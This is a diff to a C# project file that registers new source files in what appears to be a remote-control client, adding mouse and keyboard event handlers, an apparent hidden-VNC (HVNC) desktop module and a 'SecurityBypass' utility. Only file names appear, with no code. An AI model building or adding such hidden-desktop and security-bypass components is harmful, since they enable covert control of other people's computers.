@@ -110,6 +110,9 @@
     <Compile Include="Handlers\RequestGetSubFilesOrDirsHandler.cs" />
     <Compile Include="Handlers\RequestCommandHandler.cs" />
     <Compile Include="Handlers\RequestCaptureScreenHandler.cs" />
+    <Compile Include="Handlers\RequestMouseEventHandler.cs" />
+    <Compile Include="Handlers\RequestKeyboardEventHandler.cs" />
+    <Compile Include="Handlers\RequestHVNCHandler.cs" />
     <Compile Include="Handlers\RequestDownloadHandler.cs" />
     <Compile Include="Handlers\RequestOpenFileHandler.cs" />
     <Compile Include="Handlers\RequestUploadHandler.cs" />
@@ -118,6 +121,10 @@
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Utils\AssemblyLoader.cs" />
     <Compile Include="Utils\ScreenUtil.cs" />
+    <Compile Include="Utils\SecurityBypass.cs" />
+    <Compile Include="Utils\MouseOpeUtil.cs" />
+    <Compile Include="Utils\KeyboardOpeUtil.cs" />
+    <Compile Include="Utils\HVNCDesktop.cs" />
   </ItemGroup>
   <ItemGroup>
     <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
